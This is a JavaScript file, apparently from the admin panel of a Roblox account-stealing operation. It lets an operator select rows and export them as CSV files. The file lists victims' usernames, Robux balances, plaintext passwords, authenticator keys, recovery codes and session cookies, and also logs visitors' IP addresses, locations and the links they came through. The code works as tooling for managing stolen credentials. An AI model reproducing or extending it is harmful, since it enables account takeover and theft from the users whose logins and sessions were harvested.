document.getElementById("selectAll").addEventListener("change", function () {
  const checkboxes = document.querySelectorAll(".userCheckbox");
  checkboxes.forEach((checkbox) => (checkbox.checked = this.checked));
});



if(document
  .getElementById("downloadAllButton")){
document
  .getElementById("downloadAllButton")
  .addEventListener("click", function () {
    let sortBy = document.getElementById("sortBySelect").value
    const link = document.createElement("a");
    link.setAttribute("href", "/api/logs/allLogs.php?sortBy="+sortBy);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
  }

if(document
  .getElementById("downloadButton")){
document
  .getElementById("downloadButton")
  .addEventListener("click", function () {
    const selectedRows = document.querySelectorAll(".userCheckbox:checked");
    if (selectedRows.length === 0) {
      Toastify({
        text: "Please select at least one user to download.",
        duration: 5 * 1000,
        newWindow: true,
        gravity: "top",
        position: "center",
        stopOnFocus: true,
        style: {
          background: "#7558c4",
          text: "white",
          "border-radius": "5px",
        },
      }).showToast();
      return;
    }

    let csvContent = "data:text/csv;charset=utf-8,";
    csvContent += "Username,Summary,Robux,RAP,Password,AuthKey,RecoveryCodes,Cookie\n";

    selectedRows.forEach((checkbox) => {
      const row = checkbox.closest("tr");
      const username = row.querySelector(".text-zinc-500").textContent;
      const summary = row.cells[3].textContent;
      const robux = row.cells[4].textContent;
      const rap = row.cells[5].textContent;
      const password = row.querySelector(".copyable-text").textContent;
      const AuthKey = row.querySelectorAll(".copyable-text")[1].textContent;
      const RecoveryCodes = row.querySelectorAll(".copyable-text")[2].textContent;
      const cookie = row.querySelectorAll(".copyable-text")[3].textContent;

      csvContent += `${username},${summary},${robux},${rap},"${password.trim()}","${AuthKey.trim()}","${RecoveryCodes.trim()}","${cookie.trim()}"\n`;
    });

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "selected_users.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
  }

if (document
  .getElementById("downloadButtonVisits")) {
document
  .getElementById("downloadButtonVisits")
  .addEventListener("click", function () {
    const selectedRows = document.querySelectorAll(".userCheckbox:checked");
    if (selectedRows.length === 0) {
      Toastify({
        text: "Please select at least one user to download.",
        duration: 5 * 1000,
        newWindow: true,
        gravity: "top",
        position: "center",
        stopOnFocus: true,
        style: {
          background: "#7558c4",
          text: "white",
          "border-radius": "5px",
        },
      }).showToast();
      return;
    }

    let csvContent = "data:text/csv;charset=utf-8,";
    csvContent += "IP,Country,City,Type,Link,Date\n";

    selectedRows.forEach((checkbox) => {
      const row = checkbox.closest("tr");
      const ip = row.cells[1].textContent.trim();
      const country = row.cells[2].textContent.trim();
      const city = row.cells[3].textContent.trim();
      const type = row.cells[4].textContent.trim();
      const link = row.querySelector(".copyable-text").textContent.trim();
      const date = row.cells[6].textContent.trim();

      csvContent += `${ip},${country},${city},${type},"${link}","${date}"\n`;
    });

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "selected_visits.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  });
  }